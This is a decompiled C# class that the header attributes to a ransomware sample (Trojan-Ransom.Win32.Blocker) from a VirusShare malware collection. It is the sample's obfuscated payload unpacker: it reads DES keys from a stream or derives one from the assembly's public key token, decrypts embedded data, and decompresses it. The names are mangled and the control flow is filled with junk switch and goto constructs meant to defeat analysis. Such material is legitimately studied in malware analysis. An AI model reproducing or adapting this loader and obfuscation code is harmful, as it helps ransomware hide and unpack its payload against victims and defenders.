// Decompiled with JetBrains decompiler
// Type: ?1?.?5?
// Assembly: 1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 569994DA-E70A-49A4-8B1F-3DD27F439F3F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.alpb-5a19a88bd483cf3cb3f4e5b11404298316ab024cfd953cd362ffa4babf1af117.exe

using \u003F1\u003F;
using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace \u003F1\u003F
{
  internal class \u003F5\u003F
  {
    private static readonly object \u003F1\u003F;
    private static readonly int \u003F5\u003F;
    private static readonly int \u003F4\u003F;
    private static readonly MemoryStream \u003F3\u003F = (MemoryStream) null;
    private static readonly MemoryStream \u003F6\u003F = (MemoryStream) null;

    static \u003F5\u003F()
    {
      \u003F5\u003F.\u003F5\u003F = int.MaxValue;
      \u003F5\u003F.\u003F4\u003F = int.MinValue;
      \u003F5\u003F.\u003F3\u003F = \u003F72\u003F.\u003F5\u003F(0);
      \u003F5\u003F.\u003F6\u003F = \u003F72\u003F.\u003F5\u003F(0);
      \u003F5\u003F.\u003F1\u003F = \u003F70\u003F.\u003F5\u003F();
    }

    private static string \u003F7\u003F(Assembly _param0)
    {
      string str = \u003F14\u003F.\u003F5\u003F((object) _param0);
      int num = \u003F12\u003F.\u003F5\u003F((object) str, ',');
      if (num >= 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
              goto label_4;
label_3:
            str = \u003F10\u003F.\u003F5\u003F((object) str, 0, num);
            break;
label_4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F5\u003F.\u003F7\u003F);
            goto label_3;
        }
      }
      return str;
    }

    private static byte[] \u003F8\u003F(Assembly _param0)
    {
      try
      {
        string str = \u003F14\u003F.\u003F5\u003F((object) _param0);
        int num1 = \u003F24\u003F.\u003F5\u003F((object) str, \u003F75\u003F.\u003F76\u003F("_Żɯ͠Ѣթقݭ\u087E॒੪୯౦൬\u0E3C"));
        if (num1 < 0)
        {
label_1:
          switch (4)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F5\u003F.\u003F8\u003F);
              }
              num1 = \u003F24\u003F.\u003F5\u003F((object) str, \u003F75\u003F.\u003F76\u003F("\u007FŻɯ͠Ѣթ٢ݭ\u087Eॲ੪୯౦൬\u0E3C"));
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (1)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (\u003F22\u003F.\u003F5\u003F((object) str, num2) == 'n' || \u003F22\u003F.\u003F5\u003F((object) str, num2) == 'N')
            return (byte[]) null;
          byte[] numArray = \u003F18\u003F.\u003F5\u003F(\u003F20\u003F.\u003F5\u003F(\u003F10\u003F.\u003F5\u003F((object) str, num2, 16), NumberStyles.HexNumber));
          \u003F16\u003F.\u003F5\u003F((Array) numArray);
          return numArray;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] \u003F9\u003F(Stream _param0)
    {
      object obj;
      \u003F69\u003F.\u003F5\u003F(obj = \u003F5\u003F.\u003F1\u003F);
      try
      {
        Stream stream = _param0;
        MemoryStream memoryStream = (MemoryStream) null;
        ushort num1 = (ushort) \u003F67\u003F.\u003F5\u003F((object) _param0);
        if (((int) num1 & 2) != 0)
        {
label_2:
          switch (2)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u003F5\u003F.\u003F9\u003F);
              }
              DESCryptoServiceProvider cryptoServiceProvider = \u003F65\u003F.\u003F5\u003F();
              byte[] numArray1 = new byte[8];
              \u003F62\u003F.\u003F5\u003F((object) _param0, numArray1, 0, 8);
              \u003F63\u003F.\u003F5\u003F((object) cryptoServiceProvider, numArray1);
              byte[] numArray2 = new byte[8];
              \u003F62\u003F.\u003F5\u003F((object) _param0, numArray2, 0, 8);
              bool flag = true;
              foreach (byte num2 in numArray2)
              {
                if (num2 != (byte) 0)
                {
label_7:
                  switch (2)
                  {
                    case 0:
                      goto label_7;
                    default:
                      flag = false;
                      goto label_12;
                  }
                }
              }
label_11:
              switch (3)
              {
                case 0:
                  goto label_11;
              }
label_12:
              if (flag)
              {
label_13:
                switch (2)
                {
                  case 0:
                    goto label_13;
                  default:
                    numArray2 = \u003F5\u003F.\u003F8\u003F(\u003F68\u003F.\u003F5\u003F());
                    break;
                }
              }
              \u003F60\u003F.\u003F5\u003F((object) cryptoServiceProvider, numArray2);
              if (\u003F5\u003F.\u003F3\u003F == null)
              {
                if (\u003F5\u003F.\u003F5\u003F == int.MaxValue)
                {
label_17:
                  switch (3)
                  {
                    case 0:
                      goto label_17;
                    default:
                      \u003F42\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F3\u003F, (int) \u003F64\u003F.\u003F5\u003F((object) _param0));
                      break;
                  }
                }
                else
                  \u003F42\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F3\u003F, \u003F5\u003F.\u003F5\u003F);
              }
              \u003F39\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F3\u003F, 0L);
              ICryptoTransform cryptoTransform = \u003F57\u003F.\u003F5\u003F((object) cryptoServiceProvider);
              int num3 = \u003F51\u003F.\u003F5\u003F((object) cryptoTransform);
              \u003F54\u003F.\u003F5\u003F((object) cryptoTransform);
              byte[] numArray3 = new byte[\u003F54\u003F.\u003F5\u003F((object) cryptoTransform)];
              byte[] numArray4 = new byte[\u003F51\u003F.\u003F5\u003F((object) cryptoTransform)];
              int num4;
              for (num4 = (int) \u003F30\u003F.\u003F5\u003F((object) _param0); (long) (num4 + num3) < \u003F64\u003F.\u003F5\u003F((object) _param0); num4 += num3)
              {
                \u003F62\u003F.\u003F5\u003F((object) _param0, numArray4, 0, num3);
                int num5 = \u003F48\u003F.\u003F5\u003F((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                \u003F56\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F3\u003F, numArray3, 0, num5);
              }
              \u003F62\u003F.\u003F5\u003F((object) _param0, numArray4, 0, (int) (\u003F64\u003F.\u003F5\u003F((object) _param0) - (long) num4));
              byte[] numArray5 = \u003F45\u003F.\u003F5\u003F((object) cryptoTransform, numArray4, 0, (int) (\u003F64\u003F.\u003F5\u003F((object) _param0) - (long) num4));
              \u003F56\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F3\u003F, numArray5, 0, numArray5.Length);
              stream = (Stream) \u003F5\u003F.\u003F3\u003F;
              \u003F39\u003F.\u003F5\u003F((object) stream, 0L);
              memoryStream = \u003F5\u003F.\u003F3\u003F;
              break;
          }
        }
        if (((int) num1 & 8) != 0)
        {
label_25:
          switch (6)
          {
            case 0:
              goto label_25;
            default:
              try
              {
                if (\u003F5\u003F.\u003F6\u003F == null)
                {
                  if (\u003F5\u003F.\u003F4\u003F == int.MinValue)
                    \u003F42\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F6\u003F, (int) \u003F64\u003F.\u003F5\u003F((object) stream) * 2);
                  else
                    \u003F42\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F6\u003F, \u003F5\u003F.\u003F4\u003F);
                }
                \u003F39\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F6\u003F, 0L);
                DeflateStream deflateStream = \u003F36\u003F.\u003F5\u003F(stream, CompressionMode.Decompress);
                int length = 1000;
                byte[] numArray = new byte[length];
                int num6;
                do
                {
                  num6 = \u003F62\u003F.\u003F5\u003F((object) deflateStream, numArray, 0, length);
                  if (num6 > 0)
                    \u003F56\u003F.\u003F5\u003F((object) \u003F5\u003F.\u003F6\u003F, numArray, 0, num6);
                }
                while (num6 >= length);
                memoryStream = \u003F5\u003F.\u003F6\u003F;
                break;
              }
              catch (Exception ex)
              {
                break;
              }
          }
        }
        if (memoryStream != null)
          return \u003F33\u003F.\u003F5\u003F((object) memoryStream);
        byte[] numArray6 = new byte[\u003F64\u003F.\u003F5\u003F((object) _param0) - \u003F30\u003F.\u003F5\u003F((object) _param0)];
        \u003F62\u003F.\u003F5\u003F((object) _param0, numArray6, 0, numArray6.Length);
        return numArray6;
      }
      finally
      {
        \u003F27\u003F.\u003F5\u003F(obj);
      }
    }
  }
}
